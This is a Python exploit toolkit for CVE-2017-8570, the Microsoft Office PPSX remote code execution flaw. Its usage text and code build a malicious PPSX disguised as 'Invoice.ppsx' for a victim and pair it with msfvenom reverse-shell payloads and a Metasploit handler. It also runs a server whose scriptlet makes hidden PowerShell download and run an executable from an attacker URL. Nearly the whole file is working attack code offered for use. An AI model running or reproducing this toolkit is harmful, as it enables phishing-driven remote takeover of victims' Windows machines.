#!/usr/bin/env python
'''

                                                        ## Exploit toolkit CVE-2017-8570 - v1.0 (https://github.com/bhdresh/CVE-2017-8570) ##



### Scenario 1: Deliver local payload

Example commands

1) Generate malicious PPSX file
    # python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u http://192.168.56.1/logo.doc
2) (Optional, if using MSF Payload) : Generate metasploit payload and start handler
    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe > /tmp/shell.exe
    # msfconsole -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.1; run"
3) Start toolkit in exploit mode to deliver local payload
    # python cve-2017-8570_toolkit.py -M exp -e http://192.168.56.1/shell.exe -l /tmp/shell.exe

### Scenario 2: Deliver Remote payload

Example commands

1) Generate malicious PPSX file
    # python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u http://192.168.56.1/logo.doc
2) Start toolkit in exploit mode to deliver remote payload
    # python cve-2017-8570_toolkit.py -M exp -e http://remoteserver.com/shell.exe


Scenario 3: Deliver custom SCT file

Example commands

1) Generate malicious PPSX file
    # python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u http://192.168.56.1/logo.doc
2) Start toolkit in exploit mode to deliver custom SCT file
    # python cve-2017-8570_toolkit.py -M exp -H /tmp/custom.sct


### Command line arguments:

    # python cve-2017-8570_toolkit.py -h

    This is a handy toolkit to exploit CVE-2017-8570 (Microsoft Office PPSX RCE)

    Modes:

    -M gen                                          Generate Malicious PPSX file only

         Generate malicious PPSX file:

          -w <Filename.ppsx>                   Name of malicious PPSX file (Share this file with victim).

          -u <http://attacker.com/test.sct>   The path to an SCT file. Normally, this should be a domain or IP where this tool is running.

                                              For example, http://attackerip.com/test.sct (This URL will be included in malicious PPSX file and

                                              will be requested once victim will open malicious PPSX file.



    -M exp                                          Start exploitation mode

         Exploitation:

	  -H </tmp/custom.sct>                Local path of a custom SCT file which needs to be delivered and executed on target.
	                                      NOTE: This option will not deliver payloads specified through options "-e" and "-l".

          -p <TCP port:Default 80>            Local port number.

          -e <http://attacker.com/shell.exe>  The path of an executable file / meterpreter shell / payload  which needs to be executed on target.

          -l </tmp/shell.exe>                 If payload is hosted locally, specify local path of an executable file / meterpreter shell / payload.


'''

import getopt
import os
import shutil
import socket
import sys
import tempfile
import thread
from zipfile import ZipFile, ZIP_STORED, ZipInfo

BACKLOG = 50  # how many pending connections queue will hold
MAX_DATA_RECV = 999999  # max number of bytes we receive at once
DEBUG = True  # set to True to see the debug msgs


def main(argv):
    # Host and Port information
    global port
    global host
    global filename
    global docuri
    global payloadurl
    global payloadlocation
    global customsct
    global mode
    global obfuscate
    filename = ''
    docuri = ''
    payloadurl = ''
    payloadlocation = ''
    customsct = ''
    port = int("80")
    host = ''
    mode = ''
    obfuscate = int("0")
    # Capture command line arguments
    try:
        opts, args = getopt.getopt(argv, "hM:w:u:p:e:l:H:x:",
                                   ["mode=", "filename=", "docuri=", "port=", "payloadurl=", "payloadlocation=",
                                    "customsct=", "obfuscate="])
    except getopt.GetoptError:
        print
        'Usage: python ' + sys.argv[0] + ' -h'
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print
            "\nThis is a handy toolkit to exploit CVE-2017-8570 (Microsoft Word PPSX RCE)\n"
            print
            "Modes:\n"
            print
            " -M gen                                          Generate Malicious PPSX file only\n"
            print
            "             Generate malicious PPSX file:\n"
            print
            "             -w <Filename.ppsx>                  Name of malicious PPSX file (Share this file with victim).\n"
            print
            "             -u <http://attacker.com/test.sct>   The path to an SCT file. Normally, this should be a domain or IP where this tool is running.\n"
            print
            "                                                 For example, http://attackerip.com/test.sct (This URL will be included in malicious PPSX file and\n"
            print
            "                                                 will be requested once victim will open malicious PPSX file.\n"
            print
            " -M exp                                          Start exploitation mode\n"
            print
            "             Exploitation:\n"
            print
            "             -H </tmp/custom.sct>                Local path of a custom SCT file which needs to be delivered and executed on target.\n"
            print
            "                                                 NOTE: This option will not deliver payloads specified through options \"-e\" and \"-l\".\n"
            print
            "             -p <TCP port:Default 80>            Local port number.\n"
            print
            "             -e <http://attacker.com/shell.exe>  The path of an executable file / meterpreter shell / payload  which needs to be executed on target.\n"
            print
            "             -l </tmp/shell.exe>                 If payload is hosted locally, specify local path of an executable file / meterpreter shell / payload.\n"
            sys.exit()
        elif opt in ("-M", "--mode"):
            mode = arg
        elif opt in ("-w", "--filename"):
            filename = arg
        elif opt in ("-u", "--docuri"):
            docuri = arg
        elif opt in ("-p", "--port"):
            port = int(arg)
        elif opt in ("-e", "--payloadurl"):
            payloadurl = arg
        elif opt in ("-l", "--payloadlocation"):
            payloadlocation = arg
        elif opt in ("-H", "--customsct"):
            customsct = arg
    if "gen" in mode:
        if (len(filename) < 1):
            print
            'Usage: python ' + sys.argv[0] + ' -h'
            sys.exit()
        if (len(docuri) < 1):
            print
            'Usage: python ' + sys.argv[0] + ' -h'
            sys.exit()
        generate_exploit_ppsx()
        mode = 'Finished'
    if "exp" in mode:
        if (len(customsct) > 1):
            print
            "Running exploit mode (Deliver Custom SCT) - waiting for victim to connect"
            exploitation()
            sys.exit()
        if (len(payloadurl) < 1):
            print
            'Usage: python ' + sys.argv[0] + ' -h'
            sys.exit()
        if (len(payloadurl) > 1 and len(payloadlocation) < 1):
            print
            "Running exploit mode (Deliver SCT with remote payload) - waiting for victim to connect"
            exploitation()
            sys.exit()
        print
        "Running exploit mode (Deliver SCT + Local Payload) - waiting for victim to connect"
        exploitation()
        mode = 'Finished'
    if not "Finished" in mode:
        print
        'Usage: python ' + sys.argv[0] + ' -h'
        sys.exit()


def generate_exploit_ppsx():
    # Preparing malicious PPSX
    shutil.copy2('template/template.ppsx', filename)

    class UpdateableZipFile(ZipFile):
        """
        Add delete (via remove_file) and update (via writestr and write methods)
        To enable update features use UpdateableZipFile with the 'with statement',
        Upon  __exit__ (if updates were applied) a new zip file will override the exiting one with the updates
        """

        class DeleteMarker(object):
            pass

        def __init__(self, file, mode="r", compression=ZIP_STORED, allowZip64=False):
            # Init base
            super(UpdateableZipFile, self).__init__(file, mode=mode,
                                                    compression=compression,
                                                    allowZip64=allowZip64)
            # track file to override in zip
            self._replace = {}
            # Whether the with statement was called
            self._allow_updates = False

        def writestr(self, zinfo_or_arcname, bytes, compress_type=None):
            if isinstance(zinfo_or_arcname, ZipInfo):
                name = zinfo_or_arcname.filename
            else:
                name = zinfo_or_arcname
            # If the file exits, and needs to be overridden,
            # mark the entry, and create a temp-file for it
            # we allow this only if the with statement is used
            if self._allow_updates and name in self.namelist():
                temp_file = self._replace[name] = self._replace.get(name,
                                                                    tempfile.TemporaryFile())
                temp_file.write(bytes)
            # Otherwise just act normally
            else:
                super(UpdateableZipFile, self).writestr(zinfo_or_arcname,
                                                        bytes, compress_type=compress_type)

        def write(self, filename, arcname=None, compress_type=None):
            arcname = arcname or filename
            # If the file exits, and needs to be overridden,
            # mark the entry, and create a temp-file for it
            # we allow this only if the with statement is used
            if self._allow_updates and arcname in self.namelist():
                temp_file = self._replace[arcname] = self._replace.get(arcname,
                                                                       tempfile.TemporaryFile())
                with open(filename, "rb") as source:
                    shutil.copyfileobj(source, temp_file)
            # Otherwise just act normally
            else:
                super(UpdateableZipFile, self).write(filename,
                                                     arcname=arcname, compress_type=compress_type)

        def __enter__(self):
            # Allow updates
            self._allow_updates = True
            return self

        def __exit__(self, exc_type, exc_val, exc_tb):
            # call base to close zip file, organically
            try:
                super(UpdateableZipFile, self).__exit__(exc_type, exc_val, exc_tb)
                if len(self._replace) > 0:
                    self._rebuild_zip()
            finally:
                # In case rebuild zip failed,
                # be sure to still release all the temp files
                self._close_all_temp_files()
                self._allow_updates = False

        def _close_all_temp_files(self):
            for temp_file in self._replace.itervalues():
                if hasattr(temp_file, 'close'):
                    temp_file.close()

        def remove_file(self, path):
            self._replace[path] = self.DeleteMarker()

        def _rebuild_zip(self):
            tempdir = tempfile.mkdtemp()
            try:
                temp_zip_path = os.path.join(tempdir, 'new.zip')
                with ZipFile(self.filename, 'r') as zip_read:
                    # Create new zip with assigned properties
                    with ZipFile(temp_zip_path, 'w', compression=self.compression,
                                 allowZip64=self._allowZip64) as zip_write:
                        for item in zip_read.infolist():
                            # Check if the file should be replaced / or deleted
                            replacement = self._replace.get(item.filename, None)
                            # If marked for deletion, do not copy file to new zipfile
                            if isinstance(replacement, self.DeleteMarker):
                                del self._replace[item.filename]
                                continue
                            # If marked for replacement, copy temp_file, instead of old file
                            elif replacement is not None:
                                del self._replace[item.filename]
                                # Write replacement to archive,
                                # and then close it (deleting the temp file)
                                replacement.seek(0)
                                data = replacement.read()
                                replacement.close()
                            else:
                                data = zip_read.read(item.filename)
                            zip_write.writestr(item, data)
                # Override the archive with the updated one
                shutil.move(temp_zip_path, self.filename)
            finally:
                shutil.rmtree(tempdir)

    with UpdateableZipFile(filename, "a") as o:
        o.writestr("ppt/slides/_rels/slide1.xml.rels", "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\
	<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId3\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\" Target=\"script:" + docuri + "\" TargetMode=\"External\"/><Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout\" Target=\"../slideLayouts/slideLayout1.xml\"/><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/vmlDrawing\" Target=\"../drawings/vmlDrawing1.vml\"/></Relationships>")
    print
    "Generated " + filename + " successfully"


def exploitation():
    print
    "Server Running on ", host, ":", port

    try:
        # create a socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # associate the socket to host and port
        s.bind((host, port))

        # listenning
        s.listen(BACKLOG)

    except socket.error, (value, message):
        if s:
            s.close()
        print
        "Could not open socket:", message
        sys.exit(1)

    # get the connection from client
    while 1:
        conn, client_addr = s.accept()

        # create a thread to handle request
        thread.start_new_thread(server_thread, (conn, client_addr))

    s.close()


def server_thread(conn, client_addr):
    # get the request from browser
    try:
        request = conn.recv(MAX_DATA_RECV)
        if (len(request) > 0):
            # parse the first line
            first_line = request.split('\n')[0]

            # get method
            method = first_line.split(' ')[0]
            # get url
            try:
                url = first_line.split(' ')[1]
            except IndexError:
                print
                "Invalid request from " + client_addr[0]
                conn.close()
                sys.exit(1)
            # check if custom SCT flag is set
            if (len(customsct) > 1):
                print
                "Received request for custom SCT from " + client_addr[0]
                try:
                    size = os.path.getsize(customsct)
                except OSError:
                    print
                    "Unable to read custom SCT file - " + customsct
                    conn.close()
                    sys.exit(1)
                data = "HTTP/1.1 200 OK\r\nDate: Sun, 16 Apr 2017 18:56:41 GMT\r\nServer: Apache/2.4.25 (Debian)\r\nLast-Modified: Sun, 16 Apr 2017 16:56:22 GMT\r\nAccept-Ranges: bytes\r\nContent-Length: " + str(
                    size) + "\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: text/scriptlet\r\n\r\n"
                with open(customsct) as fin:
                    data += fin.read()
                    conn.send(data)
                    conn.close()
                    sys.exit(1)
                conn.close()
                sys.exit(1)
            check_exe_request = url.find('.exe')
            if (check_exe_request > 0):
                print
                "Received request for payload from " + client_addr[0]
                try:
                    size = os.path.getsize(payloadlocation)
                except OSError:
                    print
                    "Unable to read" + payloadlocation
                    conn.close()
                    sys.exit(1)
                data = "HTTP/1.1 200 OK\r\nDate: Sun, 16 Apr 2017 18:56:41 GMT\r\nServer: Apache/2.4.25 (Debian)\r\nLast-Modified: Sun, 16 Apr 2017 16:56:22 GMT\r\nAccept-Ranges: bytes\r\nContent-Length: " + str(
                    size) + "\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: application/x-msdos-program\r\n\r\n"
                with open(payloadlocation) as fin:
                    data += fin.read()
                    conn.send(data)
                    conn.close()
                    sys.exit(1)
            if method in ['GET', 'get']:
                print
                "Received GET method from " + client_addr[0]
                data = "HTTP/1.1 200 OK\r\nDate: Sun, 16 Apr 2017 17:11:03 GMT\r\nServer: Apache/2.4.25 (Debian)\r\nLast-Modified: Sun, 16 Apr 2017 17:30:47 GMT\r\nAccept-Ranges: bytes\r\nContent-Length: 1000\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: text/scriptlet\r\n\r\n<?XML version=\"1.0\"?>\r\n<package>\r\n<component id='giffile'>\r\n<registration\r\n  description='Dummy'\r\n  progid='giffile'\r\n  version='1.00'\r\n  remotable='True'>\r\n</registration>\r\n<script language='JScript'>\r\n<![CDATA[\r\n  new ActiveXObject('WScript.shell').exec('%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\\'" + payloadurl + "\\', \\'c:/windows/temp/shell.exe\\'); c:/windows/temp/shell.exe');\r\n]]>\r\n</script>\r\n</component>\r\n</package>\r\n"
                conn.send(data)
                conn.close()
                sys.exit(1)
    except socket.error, ex:
        print
        ex


if __name__ == '__main__':
    main(sys.argv[1:])
